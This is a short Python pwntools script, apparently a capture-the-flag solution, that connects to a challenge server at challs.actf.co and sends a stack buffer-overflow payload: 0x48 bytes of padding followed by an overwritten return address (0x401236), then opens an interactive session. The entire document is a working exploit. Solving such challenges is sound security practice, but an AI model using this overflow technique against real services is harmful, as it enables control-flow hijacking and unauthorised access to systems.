from pwn import *

io = remote('challs.actf.co', 31300)

io.sendline(b'a'*0x48+p64(0x401236))
io.interactive()
